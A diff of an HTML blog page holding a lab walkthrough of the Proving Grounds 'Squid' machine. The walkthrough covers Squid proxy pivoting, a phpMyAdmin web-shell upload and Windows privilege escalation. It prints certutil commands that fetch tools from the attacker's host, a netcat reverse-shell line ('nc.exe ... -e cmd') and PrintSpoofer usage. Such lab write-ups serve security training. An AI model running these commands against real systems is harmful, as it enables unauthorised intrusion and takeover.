+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
-          <!-- take out classes -->
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
 
+  
 
 
+<!-- Add header for code snippets -->
 
 
 
+<!-- Create heading anchors -->
 
 
 
-          <!-- lazy-load images -->
 
 
+  
+  
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+  
+    
+    
 
+    
+      
+        
+        
+      
 
+      
+      
 
-          <!-- create the image wrapper -->
+      
+      
+      
 
+      
+    
+      
 
+      
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
 
+      
+      
+      
 
-          <!-- combine -->
+      
+    
 
+    
+  
 
+  
+  
 
+  
+    
+    
 
+    
+      
+        
+        
+      
 
+      
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
 
+      
+      
+      
 
+      
+    
 
+    
+  
 
+  
+  
 
+  
 
+  
+  
 
+  
 
 
 
 
+<!-- return -->
 
 
 
 
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>Proving Grounds - Squid</h1>
+    
 
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- take out classes -->
-
-
-
-
-
-
-
-
-
-
-
-          <!-- lazy-load images -->
-
-
-
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
-
-
-
-          <!-- create the image wrapper -->
-
-
-
-
-
-
-
-          <!-- combine -->
-
-
-
-
-
-
-          <!-- Add header for code snippets -->
-
-
-
-          <!-- Create heading anchors -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <!-- return -->
-
-
-
-
-          <article class="px-1">
-            <header>
-              <h1 data-toc-skip>Proving Grounds - Squid</h1>
-
-
-              <div class="post-meta text-muted">
-                <!-- published date -->
-                <span>
-                  Posted
-                  <!--
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
   Date format snippet
   See: ${JS_ROOT}/utils/locale-dateime.js
 -->
@@ -2296,86 +2317,91 @@
 
 
 
-                  <time data-ts="1720666800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom">
-                    Jul 11, 2024
-                  </time>
+<time
+  
+  data-ts="1720666800"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jul 11, 2024
+</time>
 
-                </span>
+      </span>
 
-                <!-- lastmod date -->
+      <!-- lastmod date -->
+      
 
+      
+      
+      
+      
 
+      
 
+      <div class="mt-3 mb-3">
+        <a href="/../assets/img/oscp/oscp.png" class="popup img-link preview-img shimmer"><img src="/../assets/img/oscp/oscp.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+      
 
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
 
+          By
 
+          <em>
+            
+            <a href="">H3NDR1CH</a>
+            
+          </em>
+        </span>
 
+        <div>
+          <!-- pageviews -->
+          
 
-
-                <div class="mt-3 mb-3">
-                  <a href="/../assets/img/oscp/oscp.png" class="popup img-link preview-img shimmer"><img
-                      src="/../assets/img/oscp/oscp.png" alt="Preview Image" width="1200" height="630"
-                      loading="lazy"></a>
-                </div>
-
-
-                <div class="d-flex justify-content-between">
-                  <!-- author(s) -->
-                  <span>
-
-
-                    By
-
-                    <em>
-
-                      <a href="">H3NDR1CH</a>
-
-                    </em>
-                  </span>
-
-                  <div>
-                    <!-- pageviews -->
-
-
-                    <!-- read time -->
-                    <!-- Calculate the post's reading time, and display the word count in tooltip -->
-
-
-
-                    <!-- words per minute -->
-
-
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
 
 
 
-
+<!-- words per minute -->
 
 
 
 
-                    <!-- return element -->
-                    <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="446 words">
-                      <em>2 min</em> read</span>
 
-                  </div>
-                </div>
-              </div>
-            </header>
 
-            <div class="content">
-              <p>Squid was a challenging box that involved utilizing a Squid proxy to discover internal services,
-                exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges
-                using Windows-specific techniques.</p>
 
-              <p>The process included using spose to identify internal services, leveraging the proxy to access a
-                WampServer, and ultimately using FullPowers.exe and PrintSpoofer to gain SYSTEM access.</p>
 
-              <p>This machine was a great way to practice working with proxy configurations and Windows privilege
-                escalation.</p>
 
-              <h1 id="diagram">Diagram</h1>
 
-              <pre><code class="language-mermaid">graph TD
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="446 words"
+>
+  <em>2 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="content">
+    <p>Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.</p>
+
+<p>The process included using spose to identify internal services, leveraging the proxy to access a WampServer, and ultimately using FullPowers.exe and PrintSpoofer to gain SYSTEM access.</p>
+
+<p>This machine was a great way to practice working with proxy configurations and Windows privilege escalation.</p>
+
+<h1 id="diagram">Diagram</h1>
+
+<pre><code class="language-mermaid">graph TD
     A[Host Enumeration]
     A --&gt;|Nmap Scan| B[Identify Squid Proxy]
     B --&gt;|Explore Proxy Configuration| C[Tool: spose]
@@ -2389,1771 +2415,1828 @@
     J --&gt;|Capture Evidence| K[Success]
 </code></pre>
 
-              <h2 id="information-gathering"><span class="me-2">Information Gathering</span><a
-                  href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-              <h3 id="port-scan"><span class="me-2">Port Scan</span><a href="#port-scan" class="anchor text-muted"><i
-                    class="fas fa-hashtag"></i></a></h3>
-              <hr />
-
-              <ul>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">nmap -sS -Pn -n -T4 192.168.217.189</code> -p
-                    135,139,445,3128</p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%201.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration"
-                  class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-              <h3 id="http-80"><span class="me-2">HTTP 80</span><a href="#http-80" class="anchor text-muted"><i
-                    class="fas fa-hashtag"></i></a></h3>
-
-              <hr />
-
-              <ul>
-                <li>
-                  <p><a href="http://192.168.217.189:3128/">http://192.168.217.189:3128/</a> → Apparently the website
-                    uses <strong>squid/4.14</strong></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%202.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Squid is a caching and forwarding HTTP web proxy. It reduces bandwidth and improves response times
-                by <strong>caching</strong> and reusing frequently-requested web pages.</p>
-
-              <p>This is the squid repo https://github.com/squid-cache/squid</p>
-
-              <p>I was searching in the GitHub, etc., but nothing worked. So i decided to try this:</p>
-
-              <p><a
-                  href="https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid">https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid</a>
-              </p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.45.227</code>
-                    → <em>Directory Listening in my own machine</em></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%203.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>So after a while i decided to try this tool https://github.com/aancw/spose.git</p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%204.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Ok, verifying if it’s an web page running in 8080</p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%205.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Now setting up an http proxy with the extension Proxy Switcher <a
-                  href="https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com">https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com</a>
-              </p>
-
-              <ul>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">proxy swithcer</code></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%206.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>And now trying to access it</p>
-
-              <ul>
-                <li>
-                  <p><a href="http://192.168.237.189:8080/">http://192.168.237.189:8080/</a> → It’s a WampServer 3.2.3 -
-                    64bit</p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%207.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><a
-                      href="http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap">http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap</a>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%208.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><a
-                      href="http://192.168.237.189:8080/phpmyadmin/index.php">http://192.168.237.189:8080/phpmyadmin/index.php</a>
-                    → login panel MySQL - tried default creds (root:)</p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%209.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2010.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Verifying some documentation about phpMyAdmin…</p>
-
-              <p><a
-                  href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/">https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/</a>
-              </p>
-
-              <p><a
-                  href="https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f">https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f</a>
-              </p>
-
-              <ul>
-                <li>
-                  <p><a
-                      href="http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema">http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema</a>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2011.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2012.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><a href="http://192.168.237.189:8080/uploader.php">http://192.168.237.189:8080/uploader.php</a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2013.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Reverse shell must be for windows</p>
-
-              <p><a
-                  href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php">https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</a>
-              </p>
-
-              <ul>
-                <li><a
-                    href="http://192.168.237.189:8080/php_reverse_shell.php">http://192.168.237.189:8080/php_reverse_shell.php</a>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">sudo  rlwrap nc -lvnp 80</code> → Nt authorithy
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2014.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">flag</code></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2015.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <h2 id="priv-escalation"><span class="me-2">Priv Escalation</span><a href="#priv-escalation"
-                  class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-              <hr />
-
-              <p>The first thing that i want to do is revoke all firewalls. I’ve tried but the user don’t have
-                permission.</p>
-
-              <p>So after a while i decided to put winPEAS inside the machine</p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2016.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">winPEASx64.exe</code> → <em>Apparently</em> <a
-                      href="https://exploit-db.com/exploits/46718">https://exploit-db.com/exploits/46718</a> <em>-
-                      CVE-2019-0836</em> <a
-                      href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation</a>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2017.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2018.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2019.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2020.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>Ok, nothing worked, but after enumerate, and after i saw that i was an nt authority but with “local
-                service’</p>
-
-              <ul>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">whoami</code></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2021.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>I found this <a
-                  href="https://itm4n.github.io/localservice-privileges/?ref=benheater.com">https://itm4n.github.io/localservice-privileges/?ref=benheater.com</a>
-                After read the article i found that he did an script <a
-                  href="https://github.com/itm4n/FullPowers/releases">https://github.com/itm4n/FullPowers/releases</a>
-              </p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2022.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">FullPowers.exe -c "C:\Users\Public\Documents\nc.exe 192.168.45.227 4430 -e cmd" -z</code>
-                    <code class="language-plaintext highlighter-rouge">sudo rlwrap nc -lvnp 4430</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2023.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">whoami /priv</code> → Now i’ve
-                    SeImpersoantePrivilage enabled</p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2024.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-              <p>So i’ll use the https://github.com/itm4n/PrintSpoofer/releases</p>
-
-              <ul>
-                <li>
-                  <p><code
-                      class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe</code>
-                  </p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2025.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">PrintSpoofer64.exe -i -c cmd</code> → Priv
-                    escalado</p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2026.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2026.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-                <li>
-                  <p><code class="language-plaintext highlighter-rouge">flag</code></p>
-
-                  <p><a href="/../assets/img/oscp/Squid/Untitled%2027.png" class="popup img-link  shimmer"><img
-                        src="/../assets/img/oscp/Squid/Untitled%2027.png" alt="Untitled" loading="lazy"></a></p>
-                </li>
-              </ul>
-
-            </div>
-
-            <div class="post-tail-wrapper text-muted">
-              <!-- categories -->
-
-              <div class="post-meta mb-3">
-                <i class="far fa-folder-open fa-fw me-1"></i>
-
-                <a href="/categories/proving-grounds/">Proving Grounds</a>,
-                <a href="/categories/easy/">Easy</a>
-              </div>
-
-
-              <!-- tags -->
-
-              <div class="post-tags">
-                <i class="fa fa-tags fa-fw me-1"></i>
-
-                <a href="/tags/windows/" class="post-tag no-text-decoration">Windows</a>
-
-                <a href="/tags/web/" class="post-tag no-text-decoration">Web</a>
-
-                <a href="/tags/squid/" class="post-tag no-text-decoration">Squid</a>
-
-                <a href="/tags/oscp/" class="post-tag no-text-decoration">OSCP</a>
-
-              </div>
-
-
-              <div class="
+<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="port-scan"><span class="me-2">Port Scan</span><a href="#port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<hr />
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">nmap -sS -Pn -n -T4 192.168.217.189</code> -p 135,139,445,3128</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%201.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="http-80"><span class="me-2">HTTP 80</span><a href="#http-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<hr />
+
+<ul>
+  <li>
+    <p><a href="http://192.168.217.189:3128/">http://192.168.217.189:3128/</a> → Apparently the website uses <strong>squid/4.14</strong></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%202.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
